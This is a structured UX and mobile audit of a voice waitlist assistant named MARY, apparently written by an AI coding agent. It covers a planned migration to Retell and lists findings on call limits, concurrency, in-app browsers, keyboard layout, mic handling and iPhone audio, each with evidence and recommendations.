findings.recommendation: Under Retell, default to an open mic, with denoising_mode set to noise-and-background-speech-cancellation and interruption_sensitivity tuned below 1 for speakerphone use. Replace the hold bar with a visible mute toggle (ElevenLabs turned muting on by default on 2026-08-24) and keep 'Type instead'. Keep hold-to-talk only as a manual 'noisy room' option if testing shows it is still needed.

findings.title: Retell's default silence and length limits are wrong for a two-minute waitlist call and cost money on abandoned tabs
findings.evidence: Retell defaults: reminder_trigger_ms 10000, reminder_max_count 1, end_call_after_silence_ms 600000 (10 min), max_call_duration_ms 3600000 (https://docs.retellai.com/api-references/create-agent). A plausible MARY setup costs voice infra $0.055 + TTS $0.015 + GPT 5.6 Terra $0.064 + denoise $0.005 ≈ $0.139/min (https://www.retellai.com/pricing), so an abandoned tab left on the default silence limit burns about $1.39, versus about $0.35 for a real 2.5-minute sign-up. Today MARY's nudges (mary-app.tsx:378-398, 22 s, 3 lines in text.ts:137-141) fire only when the mic is muted or missing.
findings.user_impact: People who walk away leave a live, billed line open for up to 10 minutes. People who go quiet get a single generic reminder instead of MARY's own nudges, and the call never closes cleanly into the end screen.
findings.recommendation: In the Retell agent set reminder_trigger_ms to about 8000, reminder_max_count to 2 (prompting the LLM with the IDLE_NUDGES wording), end_call_after_silence_ms to about 60000, and max_call_duration_ms to about 480000. On the client, an onEnd with a silence disconnection_reason should land on the end screen with the partial save, not an error.

findings.title: No 'all lines busy' state: Retell allows 20 concurrent calls by default and a launch spike will exceed that
findings.evidence: 'Pay-As-You-Go workspaces are allocated a quota of 20 concurrent calls by default … All active voice calls draw from the same concurrency pool'. Burst is capped at 3× and adds $0.10/min for the whole call (https://docs.retellai.com/deploy/concurrency). ElevenLabs' widget added 'concurrency queue status' on 2026-08-24 (https://elevenlabs.io/docs/changelog/2026/8/24). MARY's start() (mary-app.tsx:508-536) has no busy or capacity branch.
findings.user_impact: On launch day (Product Hunt, a newsletter) visitors 21 and up would get a failed call at the exact moment demand peaks. Those leads are most likely lost.
findings.recommendation: When web-call creation fails with a concurrency error, show a warm 'MARY is on a lot of calls right now' state. Offer to switch to typing (which still uses /api/turn) and, once built, 'Call me instead'. Keep the collected fields. Turn on burst for launch days, and budget extra concurrency based on the expected peak.

findings.title: Silence while save_lead runs: use Retell's speak-during-execution and filler speech
findings.evidence: Today the end screen shows 'Securing your place…' while the sheet call runs (end-screen.tsx:81), and during a call only '…' appears while she is thinking (call-stage.tsx:255). Retell custom functions support 'Speak During Execution' (e.g. 'Let me retrieve that information for you') (https://docs.retellai.com/build/single-multi-prompt/custom-function). By default a function 'isn't retried — if the request fails or times out, the agent receives the error message' (https://docs.retellai.com/build/conversation-flow/custom-function). ElevenLabs recommends 3.0 s soft-timeout fillers (https://elevenlabs.io/docs/eleven-agents/customization/conversation-flow), and GPT-Live-1 'can keep a conversation moving while … actions run' (2026-09-10).
findings.user_impact: The Apps Script write plus position lookup can take seconds. Without a filler, MARY goes quiet at the very moment the visitor is being signed up, which reads as a dropped call.
findings.recommendation: Turn on speak_during_execution for save_lead with a MARY-voiced line ('One sec — locking in your spot'). Set a function timeout of 8–10 s. Write the prompt so that on a timeout she confirms the details are saved and says the position will come by email, rather than reading out an error. Consider enable_backchannel with a low frequency for long answers.

findings.title: Keep MARY's differentiator in Retell: live progress pills and an email readback the visitor can correct
findings.evidence: The pills show captured values, including the email, during the call (progress-pills.tsx; /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/funnel/shots/convo-ios-15-progress-pills.png). No competitor widget does this (ElevenLabs, Vapi and Retell widgets show only an orb or waveform and a transcript). Retell supplies no such UI, and the contract already plans note_details plus /api/retell/call-status returning CallProgress.collected (src/lib/retell-shared.ts:28, 102-117). Spoken emails are a known failure mode: OpenAI markets 'alphanumeric recognition' as a distinct GPT-Live-1 capability (2026-09-10), and GPT Transcribe adds keyword hints (https://developers.openai.com/api/docs/changelog, 2026-07-28). The pill text is truncated at max-w-32 (progress-pills.tsx:333).
findings.user_impact: Seeing 'sarah@brightpath.com' appear as she says it is what makes a voice sign-up trustworthy. Lose it in the migration and wrong emails go unnoticed. Without a way to fix it, a misheard email turns a warm lead into a dead one.
findings.recommendation: Under Retell, have MARY call note_details as each field is confirmed, and update the pills from call-status polling (or metadata events). Make the email pill tappable so the visitor can correct it by typing, and send the correction into the call through /api/retell/inject (the SDK 3.0.1 README describes update({ call_control: { additional_context, trigger_response: true } })). Remove the max-w-32 truncation for the email.

findings.title: The end screen offers no next action: no share link, and no booking slot for callbacks
findings.evidence: The signed-up end screen ends with 'Start another conversation' (end-screen.tsx:176-183). The callback copy promises 'A real person calls you on …' with no time (conversation/text.ts:65-75). Best practice: 'give them something to do - a referral link' at 'the highest-intent moment you will get from that person for weeks' (https://21st.dev/blog/react-waitlist-page-components, 2026-08-20). Retell's homepage demo is itself 'Lead Qualification' leading to a scheduled call (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/sites-ios.json), and Retell is moving booking to its Cal.com integration by 10/31/2026 (https://docs.retellai.com/deprecation-notice/overview).
findings.user_impact: Qualified, excited visitors leave with nothing to do. Callback requests become 'someone will call at some point', and hot leads cool off while waiting.
findings.recommendation: Signed-up screen: add one share action (native share sheet with the site URL; add referral tracking later) and keep 'Start another conversation' secondary. Callback screen: add a 'Pick a time' booking link (Cal.com) that is prefilled with name and email. With Retell, MARY can offer times during the call through the Cal.com integration instead of promising a callback.

findings.title: Offer 'Call me instead' (a real phone call) for in-app browsers and failed audio, as Retell's own demo does
findings.evidence: Retell's homepage 'Try Our Live Demo' is a form with use case, name and phone, then 'Get a call' (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/sites-ios.json, captured 2026-09-26). Retell's widget has a callback mode with data-tc for a terms URL (https://docs.retellai.com/deploy/chat-widget). MARY's in-app-browser and mic-failure copy can only offer typing (conversation/text.ts:98-118), and the iPhone audio path needs a 'Can't hear her?' escape (composer.tsx:320-338). Outbound AI voice counts as 'artificial voice' under the TCPA and needs prior express consent (https://justcall.io/blog/ai-voice-agent-disclosure-laws.html, 2026-09-22). Telephony costs from $0.015/min (https://www.retellai.com/pricing).
findings.user_impact: Visitors arriving from Instagram or LinkedIn in-app browsers, people with denied mics, and iPhones with audio trouble currently lose the voice experience altogether. A phone call has none of the browser audio risks.
findings.recommendation: After Retell slice 2, add a secondary 'Rather talk on the phone? We'll call you now' option on the mic-error notice and the in-app-browser notice. It should collect the phone number with an explicit consent checkbox and record the timestamp, then start an outbound call with the same agent and pass sessionId and known fields as dynamic variables so MARY continues where the visitor left off.

findings.title: Use Retell's simulation testing, versioning and live monitoring to guard MARY's script
findings.evidence: CLAUDE.md says there is no browser or audio test harness, and retell-migration.md:64-68 names grounding discipline as the main risk of porting the prompt. Retell Conductor (2026-07-02) plays scenarios against an agent without dialing, turns failed calls into test cases, and shows proposed changes side by side. Agent Versioning 2.0 (2026-05-27) adds staging and production environment tags plus a Voice Orb share link. Live Call Monitoring (2026-06-19) adds real-time transcripts, scoring by sentiment, latency and interruptions, and listen, whisper or take over (https://www.retellai.com/changelog). SDK 3.x adds monitorCall().takeOver() (README).
findings.user_impact: Prompt changes to MARY currently reach real visitors unverified. Regressions such as re-asking known fields, recording ungrounded details or a mangled email readback get found only by losing leads.
findings.recommendation: For build slice 3, script the five CLOSE scenarios plus the ones in mary-voice.md (early leaver, price objection, 'just email me') as Conductor simulations. Gate every prompt change on staging tags, and share the Voice Orb link for stakeholder review. Give the operator a Live Monitoring dashboard filtered on outcome=callback, so hot leads can be taken over live.

findings.title: Brand words are not given to speech recognition or TTS: OmniSuite, Omnikom, MARY
findings.evidence: The /api/transcribe prompt is generic, with no vocabulary (src/routes/api/transcribe.ts:26-30). Retell has boosted_keywords to bias the transcriber and pronunciation_dictionary to guide synthesis (https://docs.retellai.com/api-references/create-agent). GPT Transcribe added keyword hints (https://developers.openai.com/api/docs/changelog, 2026-07-28).
findings.user_impact: 'Omnikom' heard as 'omni com' or 'Omni calm' leaks into transcripts, the sheet and MARY's replies, and a mispronounced brand name on a sales call undercuts credibility.
findings.recommendation: Add the brand words (OmniSuite, Omnikom, MARY) to the current transcribe prompt now. In Retell set boosted_keywords ['OmniSuite','Omnikom','MARY'] plus common industry terms from the playbook, and add pronunciation_dictionary entries for OmniSuite and Omnikom.

findings.title: No post-call feedback or sentiment signal; Retell's post-call analysis gives it for free
findings.evidence: ElevenLabs' widget can collect feedback 'After conversation' (https://elevenlabs.io/docs/agents-platform/customization/widget), and Sesame's preview asks for 'feedback at the end of your call' (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/market/shots/sesame-ios.png). Retell post-call analysis always returns call_summary, user_sentiment and call_successful, plus custom boolean, text, number or selector fields, delivered by call_analyzed (https://docs.retellai.com/features/post-call-analysis-overview). MARY's end screen has no feedback, and lessons come only from /api/reflect (mary-app.tsx:95-119).
findings.user_impact: The team cannot tell which conversations felt good or bad, or why people declined. A sentiment and summary column is also what a salesperson wants to see before calling a callback lead.
findings.recommendation: Under Retell, add post_call_analysis_data for outcome (selector: joined, callback, declined, incomplete; already in retell-shared.ts:32), industry, business, callback_requested and objection. Write call_summary and user_sentiment into the sheet row and show them in the owner view. Skip building a rating widget unless summaries turn out not to be enough.

findings.title: Recovery from a denied mic is text only; Chrome 151's <usermedia> element restores access in-page
findings.evidence: The landing never says a mic prompt is coming (landing.tsx:139-165). After a denial the copy says 'Tap the mic button to ask again' (conversation/text.ts:106), but browsers do not re-prompt after a hard deny. Chrome 151's <usermedia> element (2026-06-29) gives 'a specialized recovery flow', and Google Meet reported '+131% successful permission recovery' (https://developer.chrome.com/blog/usermedia-html-element). It is Chrome-only, so it is progressive enhancement, and iPhone Safari keeps the current path.
findings.user_impact: Desktop Chrome visitors who hit 'Block' by reflex are stuck typing, or have to dig into site settings with no guidance.
findings.recommendation: Add 'She'll ask for your microphone' as microcopy next to 'Start talking'. Where supported (feature-detect), render <usermedia> in the mic-error notice. Otherwise show browser-specific steps to re-enable. The Retell SDK only reports permission errors through onError, so this UI stays ours after the migration.

findings.title: Retell voice settings to test and one to avoid: Expressive Mode and dynamic speed, but not Colloquial Model on confirmations
findings.evidence: Retell's changelog on 2026-06-19 added Expressive Mode (automatic or manual emotion tags such as [sigh] and [long pause]) and a Colloquial Model that 'rewrites how your agent phrases things in real time' (https://www.retellai.com/changelog). Agent config adds enable_dynamic_voice_speed and voice_speed (https://docs.retellai.com/api-references/create-agent). ElevenLabs voices on Retell cost $0.040/min versus $0.015/min for platform voices (https://www.retellai.com/pricing). MARY's playbook depends on exact readback and confirmation lines (docs/mary-voice.md:179-200, e.g. 'sarah, at brightpath dot com — got it.'). Today's voice is Gemini TTS 'Kore' (src/routes/api/speech.ts:35, 50).
findings.user_impact: The right voice settings make MARY sound more human than today's pipeline. A real-time rephrasing layer could, however, alter grounded confirmations and the email readback, which are the lines that must stay exact.
findings.recommendation: A/B two or three voices, including one ElevenLabs voice (about +$0.025/min), with Expressive Mode on and dynamic voice speed on. Keep Colloquial Model off, or verify in Conductor simulations that it never changes readback and confirmation lines.

mobile.summary:
Mobile/Apple lens, checked after the audio fix. I drove the live site (https://omnisuite.omnikom.io, which runs PR #1) and a git-archive snapshot of branch HEAD 5f531ad (PR #2 plus the dormant Retell adapter). Both ran in the iPhone 13 profile (390x664), iPhone SE (375x548), iPhone 13 landscape (750x342), Android Chrome (Pixel 8, 412x783), an Instagram in-app user agent, an emulated iOS keyboard (visualViewport shrunk to 420 and 360 px) and faked mic mute/ended events. Every /api route was mocked. That made 0 of the 4 allowed live AI calls and no lead POSTs. Line numbers refer to 5f531ad. Working files are in /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/ (the driver is mobile.mjs, screenshots are in shots/, run logs are run-*.txt, the Retell and LiveKit source is in retell-sdk/).

Three things work well: 100vh vs dvh is fine (every screen is a fixed container or h-dvh and the page itself never scrolls, so Safari's toolbar doesn't jump), Android Chrome runs the call route cleanly, and PR #2's wake lock follows WebKit's rules.

Four problems cost leads or trust:
- **Typing and landscape hide the question.** When the keyboard is open or the phone is sideways, MARY's words disappear entirely (live and branch).
- **In-app browsers get the wrong message.** In Instagram and similar in-app browsers the correct "open in browser" message is overwritten by a generic one that points at a button that doesn't exist.
- **The live layout isn't in git.** The live mobile layout contains classes that exist in no git ref, so publishing PR #2 as-is would regress small phones.
- **The "Can't hear her?" row does more harm than good now.** It shows from second 0 on every iPhone and, on the branch build, pushes her first question off a 390x664 screen.

Retell (LiveKit 2.22.3 underneath) would fix the missing mic-interruption handling. It would not touch the layout, keyboard, in-app or wake-lock issues. It brings two new risks: a 2026 LiveKit report of iPhone audio coming out of the earpiece, and calls ending when someone switches apps for more than 45 seconds.

findings.title: In Instagram/LinkedIn in-app browsers (and after any mic denial) the right message is overwritten by a generic one that points at a button that doesn't exist
findings.evidence: Driven on live (all /api mocked) and on the branch with an Instagram iOS UA and getUserMedia rejecting NotAllowedError (also with mediaDevices undefined). The notice always reads "I couldn't open the microphone. Tap the mic button to try again, or keep going by typing." and never the in-app copy in text.ts:101-103. Screenshots: /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/inapp-denied-live-inapp-after-hold.png and .../shots/inapp-nomedia-local-inapp-after-hold.png; log .../run-inapp-denied-live.txt. Cause: primeMicPermission sets the in-app message (mary-app.tsx:602-606 at 5f531ad). The hold effect then calls c.recorder.open() (mary-app.tsx:286-293). hold-recorder.ts:118 calls navigator.mediaDevices.getUserMedia directly, without wrapping the error in MicUnavailableError, so micMessage() falls through to 'unknown' and overwrites the first message. Hold mode is the default and has no mic button (composer.tsx:230 renders it only when !holdMode). The 64px Hold button stays the main control and the status says 'Hold the button while you talk'. A plain iPhone denial hits the same root cause (funnel lens log-deny-ios.json, t=7232). Meta's Android apps don't grant camera/mic to their WebView: https://developers.facebook.com/community/threads/432379558191221
findings.user_impact: Visitors from social links are a large share of waitlist traffic. They are told to tap a button that isn't there, and they keep pressing a Hold button that can never work. They never see the one fix that works: open the page in a real browser. Many will leave instead of typing.
findings.recommendation: (1) hold-recorder.ts:117-126: wrap getUserMedia in try/catch and throw new MicUnavailableError(micFailureFrom(error)). Export micFailureFrom from audio-engine.ts, and map a missing navigator.mediaDevices to 'unsupported'. (2) mary-app.tsx hold effect: skip recorder.open() when the tap's primeMicPermission already failed (set a c.micPrimeFailed flag in start()). The first message then stands and no second prompt fires. (3) composer.tsx: when mic.error is set in hold mode, hide HoldButton, make the textarea the main control and add a small 'Try the mic again' link. Make micMessage aware of the mode ('tap Hold' vs 'tap the mic button'). (4) Add a unit test in tests/unit calling micMessage with a raw DOMException.

findings.title: With the phone keyboard up or the phone in landscape, MARY's words disappear entirely
findings.evidence: call-stage.tsx:203 (centre area flex-1 min-h-0) and :211 (caption box h-[10.5rem] overflow-hidden, which is allowed to shrink). With the iOS keyboard emulated through the path use-viewport.ts:27-49 drives (visualViewport 420 and 360 px), the caption box measured height 0 and the question 'And what should I call you?' sat at y=324-354, fully clipped (currentLineVisible=false): /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/keyboard-ios-local-keyboard-360.png. The live build is the same: .../shots/keyboard-ios-live-keyboard-360.png. Android Chrome (resizes-content) is the same: .../shots/keyboard-android-local-keyboard-360.png. Landscape 750x342 also gives caption height 0, and the minimum 140px orb (mary-app.tsx:735-736) overlaps the progress pills: .../shots/landscape-local-after-welcome.png and landscape-live-after-welcome.png. In 'Type instead' mode the screen still shows the 64px Hold button and the 'Hold the button while you talk' status (composer.tsx:178,203). Safari iOS ignores interactive-widget (MDN browser-compat-data 8.1.3, 2026-09-24: html.elements.meta.name.viewport.interactive-widget safari_ios=false), so the JS hook is the only thing adapting the layout.
findings.user_impact: Anyone typing on a phone, whether in 'Type instead' mode or spelling out an email, can't see the question they are answering. Typing-only visitors with the sound off see an orb, a Hold button and a text box, and nothing else.
findings.recommendation: In call-stage.tsx, when keyboardHeight is set or the height is under about 480px: hide the progress pills and the 'before' line, and shrink the orb to a 40-48px inline avatar (change the Math.max(140) floor in mary-app.tsx:736). Give the caption min-h-0 with its own overflow-y-auto, anchored to the newest line, instead of a fixed h-[10.5rem], so the current question always renders directly above the composer. In composer.tsx, hide HoldButton in typing mode (!voiceWanted) and while the textarea has focus, and show a 44px mic icon instead. In use-viewport.ts, also account for visualViewport.offsetTop. Add a two-column layout for (orientation: landscape) and (max-height: 500px).

findings.title: The live mobile layout is not in git: publishing PR #2 as-is would regress small phones
findings.evidence: The live bundle https://omnisuite.omnikom.io/assets/routes-DZfdjxLS.js contains 'flex h-[8.5rem] ... sm:h-[11rem]' (caption), 'min-h-12 shrink-0 items-center gap-2 sm:min-h-14' (header) and a call section with 'px-3'. `git log --all -S"h-[8.5rem]"` and `-S"min-h-12 shrink-0 items-center gap-2"` return nothing across every ref (origin/main 44318ba, PR #2 5f531ad, archive tags). The repo uses h-[10.5rem] (call-stage.tsx:211). Measured at 390x664: live shows 'And what should I call you?' (.../shots/portrait-live-after-welcome.png), while the branch clips it (.../shots/portrait-local-after-welcome.png, currentLineVisible=false). iPhone SE 375x548: the live Start button is at y=457-505 (funnel lens log-landing-se.json), while the branch puts it at y=568-624, entirely below the fold (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/run-se.txt, shots/se-local-landing.png). The live audio chunk audio-engine-I_qx9wg2.js has PR #1's marker (sinkElement) but not PR #2's (wakeLock, elementRestarted). So live = PR #1 audio plus Lovable-side UI edits that were never synced.
findings.user_impact: Publishing the GitHub branch would replace the compact layout the operator just checked on the iPhone. SE visitors would lose the above-the-fold Start button, and iPhone 13 visitors would lose sight of MARY's first question.
findings.recommendation: Before merging PR #2, check the GitHub sync state in Lovable and get Lovable's unsynced UI changes into git. Alternatively, diff the live routes chunk against the `bun run build` output for call-stage, landing and site-frame and port the classes over. Rebase PR #2 on the result. Re-run `node mobile.mjs portrait` and `node mobile.mjs se` against the Lovable preview before Publish -> Update.

findings.title: The iPhone 'Can't hear her?' row shows from second 0 for three answers, takes 46px that hides her question on the branch build, and its buttons are 21px tall
findings.evidence: mary-app.tsx:389-409 (show while answers < 3) and composer.tsx:320-338. Measured: the hint row is 358x46 at y=606 during her very first line; 'Play sound' is 76x21 and 'I can hear her' is 91x21 (live: 70x19). Header toggles are 40x32 (call-stage.tsx:157,184). Tapping 'I can hear her' grows the caption from 117px to 168px and makes the question visible: /tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/shots/dismiss-local-after-welcome.png vs dismiss-local-after-dismiss.png (run-dismiss.txt). The row also shows in 'Type instead' mode. Audio is now confirmed on a real iPhone 13 (PROJECT-STATE.md:67), so the row mostly reaches people who can already hear her. Apple HIG asks for at least 44x44 pt hit targets: https://developer.apple.com/design/human-interface-guidelines/buttons
findings.user_impact: It plants doubt during the first impression, while she is audibly talking. It squeezes the name, business and email questions, the most important stretch of the funnel. The 21px buttons are easy to miss one-handed.
findings.recommendation: Show the row only after her first line has finished and the visitor hasn't pressed Hold or typed within about 6 seconds, or turn it into a single 44px 'Sound' chip in the header. Retire it after the first answer instead of the third. Give both buttons min-h-11 px-4. In Retell mode 'answers' never increases when transcript is off (retell-loader.ts sets transcript: Boolean(transcriptKey), and lines arrive only through onTranscript), so the row would stay up for the whole call. Base the rule on time and presence instead of the line count.

findings.title: In hold mode nothing notices the mic being muted or taken (AirPods switch, incoming call, Siri); MARY then blames the visitor's voice
findings.evidence: hold-recorder.ts adds no listeners to the track and none for devicechange. A census in a running call found trackEvents [] and devicechange 0 (/tmp/claude-0/-home-user-remix-of-mary-s-waitlist-ai/5db0fce8-f9f0-58ea-ab86-b04df5aa8cc5/scratchpad/ux-audit/mobile/run-mute.txt). The hands-free path does listen (audio-engine.ts:2016-2031). After a faked 'mute' the UI kept showing 'Hold to talk' and diagnostics read micTrack 'live (muted)'. A muted track records silence, which hits SILENT_PEAK (hold-talk.ts:127) and then onMissed (mary-app.tsx:214). The visitor sees 'Didn't catch that. Hold, speak close to the phone' (composer.tsx:208), then 'Loud in here? Type your answer' (composer.tsx:211). An ended track recovers on the next press (run-ended.txt: 2 getUserMedia calls, 2 track stops). iOS keeps the track live all call (hold-recorder.ts:9-13). AirPods are listed as unproven in .claude/POSITION.md:122.
findings.user_impact: After a phone call, Siri, or putting in or removing AirPods, the visitor's next answers vanish. MARY tells them to speak closer or blames the room, and after two tries pushes them to typing.
findings.recommendation: In HoldRecorder.openLine (around hold-recorder.ts:148), listen for mute, unmute and ended on the track and for navigator.mediaDevices devicechange, and expose onLost(reason). Wire it through the hold deps in mary-app.tsx to SET_MIC {error: micLostMessage(reason)}. In HoldTalk.press, if the track is muted, stop it and reopen with getUserMedia inside the press gesture before calling start(). In HoldTalk.finish, treat peak === 0 exactly (the mic went dead) differently from quiet speech: reopen and say 'the microphone went quiet, hold again'.

findings.title: Retell's audio on iPhone has a recent report of playing through the earpiece, and the page cannot detect it
findings.evidence: livekit/client-sdk-js issue #1836 (opened 2026-03-12, closed): on iPhone 15 Pro, LiveKit web audio was 'coming from the ear Receiver' while the device list said Speaker. https://github.com/livekit/client-sdk-js/issues/1836. Issue #1568 (iOS 26 Speaker Selection) was closed as not planned: https://github.com/livekit/client-sdk-js/issues/1568. Retell SDK 3.0.1 livekit-transport.ts:43-55,96 passes only deviceId options and calls track.attach(). Its src has no AudioPlaybackStatusChanged handling (retell-sdk/package/src, grep). bun.lock pins livekit-client 2.22.3. The team fixed exactly this failure for MARY in a5156d2 ('iPhone plays MARY through the speaker, not a phone-call route').
findings.user_impact: If it happens, iPhone visitors hear MARY faintly from the earpiece while holding the phone at arm's length and assume she is broken. That is the symptom PR #1 just fixed.
findings.recommendation: Treat a real-iPhone Retell check as a go-live gate. Add a 'Retell route' test to /soundcheck (join a test call with ?voice=retell, then mark speaker or earpiece, with the ring switch set to Ring and Silent). Keep the Sound chip wired to resumeAudio(), and have it also detach and re-attach the agent track. Don't flip VOICE_PROVIDER until speaker output is confirmed on iPhone 13 (iOS 18) and on iOS 26.

findings.title: Emails and phone numbers typed on a phone get iOS auto-capitalisation and autocorrect, and no email or number keypad
findings.evidence: The composer textarea (composer.tsx:258-285) has no inputMode, autoCapitalize, autoCorrect, spellCheck or autoComplete. The turn already returns nextField (mary.functions.ts:53), but nothing under src/features/mary keeps it. Safari iOS support (MDN browser-compat-data 8.1.3, 2026-09-24): autocapitalize 10.3+, autocorrect 14.5+, inputmode 12.2+.
findings.user_impact: 'Sarah@brightpath.com' starts with a capital letter, domain words can be 'corrected', and there is no number keypad for the phone number. The typos land in exactly the two fields that make the lead reachable.
findings.recommendation: Keep turn.nextField in the session reducer. In composer.tsx, when nextField is 'email' set inputMode='email', autoCapitalize='none', autoCorrect='off', spellCheck={false} and autoComplete='email'. When it is 'phone' set inputMode='tel' and autoComplete='tel'. Consider an <input> for those two turns so iOS AutoFill offers the visitor's own email and number.

findings.title: In-app browser detection misses TikTok and Android WebViews, and nothing warns the visitor before they tap Start
findings.evidence: audio-engine.ts:1263-1268: the regex matches 'TikTok', but TikTok in-app user agents carry musical_ly_, trill_ or BytedanceWebview, and generic Android WebViews carry '; wv)' (https://useragent.in/in-app-browser-user-agents). landing.tsx has no in-app branch: 'Start talking' is always the main button. Per https://plugwith.me/blog/what-escapes-instagram-in-app-browser-in-2026/ (2026-08-17, updated 2026-09-24), x-safari-https stopped being reliable in Meta webviews around mid-2025, while instagram://extbrowser via meta refresh still worked.
findings.user_impact: Visitors from TikTok or an Android WebView get the generic 'Safari, Chrome or Edge' copy. Visitors from every social app hit a dead mic before learning how to get out of the in-app browser.
findings.recommendation: Extend isInAppBrowser to match musical_ly|trill_|BytedanceWebview|; wv\) and return the app name. In landing.tsx, when in-app, show one line above the buttons: 'Opened inside Instagram? For voice, open in Safari: ⋯ → Open in external browser', plus a Copy link button. Make 'Type instead' an equal first choice. Try an instagram://extbrowser meta-refresh link on Instagram and an intent://…;package=com.android.chrome link on Android, and log whether they work.

findings.title: With Retell, leaving the app for more than 45 seconds (for example to copy an email) ends the call; MARY today just waits
findings.evidence: retell/agent.json sets end_call_after_silence_ms 45000. mary-app.tsx:443-447 (5f531ad) hangs up the Retell call on pagehide. LiveKit pauses sending the mic after 5 seconds muted (livekit-client LocalTrack.ts:437-444), and iOS mutes capture in the background (https://developer.apple.com/forums/thread/689182). The MARY path only flushes the lead when hidden (mary-app.tsx:449-458) and the call screen keeps waiting.
findings.user_impact: A visitor who leaves to copy their email from Mail or to answer a message comes back to an ended call in the middle of signing up.
findings.recommendation: In Retell mode, note the time on visibilitychange→hidden. On return, if the call has ended, show 'Welcome back — pick up where we left off', which runs the existing Resume path (retell.start with the known fields and the same session, so the same sheet row). Consider raising end_call_after_silence_ms to about 90000, or have the agent's first reminder say 'take your time'.

findings.title: Real-device checks are still missing for the no-mic path under the silent switch, AirPods mid-call, the Instagram webview and Android
findings.evidence: POSITION.md:122 and PROJECT-STATE.md:67 say Mac Safari, the no-mic path and AirPods are still unproven. /soundcheck already has the no-mic element test (soundcheck.tsx:261, test 4) and the ring-switch selector. The Playwright harness is Chromium with a spoofed Safari user agent, so it cannot reproduce iOS audio sessions, the keyboard or Bluetooth routing. The silent-switch behaviour depends on WebKit putting a MediaStream-backed <audio> in the MediaPlayback category (per POSITION.md:80). Web Audio on its own is muted by the switch: https://www.audjust.com/blog/unmute-web-audio-on-ios
findings.user_impact: 'Type instead' visitors with the silent switch on, and AirPods users, are the next likely 'she's silent' reports, and nobody has tested them.
findings.recommendation: Run a 15-minute script on the iPhone 13: (1) /soundcheck tests 1-6 with the switch on Silent, then Ring. (2) A 'Type instead' call with the switch on Silent. (3) A voice call where AirPods go in after the first answer, two more answers, then the AirPods come out. (4) Low Power Mode on, hands-free, wait 45 seconds. (5) Open the link from an Instagram DM and from a LinkedIn post. (6) Repeat on Android Chrome and Instagram for Android. Record the results as a table in docs/. Re-run the same matrix with ?voice=retell before switching providers. If the no-mic path is silent on Silent, set navigator.audioSession.type='playback' only when !voiceWanted.

findings.title: The PR #2 wake lock follows WebKit's rules, but a failure is silent and Low Power Mode locks the screen after 30 seconds
findings.evidence: mary-app.tsx:62-82 (5f531ad): the rejection handler is `() => {}`, so nothing is recorded. WebKit WakeLock.cpp:74-83 (WebKit main) grants the first lock only with transient activation and allows re-requests after that, which matches the PR comment. Requests were seen at the tap (userActivation active) and again on return to visible (wakelock run: 6742, 6879 and 15022 ms). Headless Chromium denies, so a grant was not observed. Apple says Low Power Mode sets Auto-Lock to 30 seconds: https://support.apple.com/en-us/101604. MDN says requests may be rejected in power-save mode: https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API. browser-compat-data: Safari iOS 18.4+ full support, 16.4-18.3 broken in Home Screen apps. Hands-free mode has no touches to reset the auto-lock timer.
findings.user_impact: On older iOS versions, in some webviews, or when a request is refused, a hands-free visitor in Low Power Mode sees the screen lock after 30 seconds. That suspends her voice and the mic.
findings.recommendation: Record the wake-lock result with trace({type:'wakeLock', ok}) and add it to audioDiagnostics (audio-engine.ts around line 603). If it is denied while in hands-free mode, show a one-time 'Keep the screen on' hint, or stay in hold mode.

findings.title: In landscape the header and composer ignore the left and right safe-area insets
findings.evidence: Only env(safe-area-inset-bottom) is used anywhere (call-stage.tsx:289; the live CSS is the same). The viewport meta sets viewport-fit=cover (__root.tsx:83-84), so the page extends under the notch in landscape, and the header padding is px-8 (32px) at the 750px landscape width (.../shots/landscape-local-after-welcome.png). browser-compat-data: viewport-fit supported since Safari iOS 11.
findings.user_impact: In landscape the logo and composer edges can sit under the notch or Dynamic Island and the rounded corners.
findings.recommendation: Add pl-[max(1rem,env(safe-area-inset-left))] and pr-[max(1rem,env(safe-area-inset-right))] to the landing, call and end sections. That is cheapest when done together with the landscape layout in the keyboard/landscape finding.
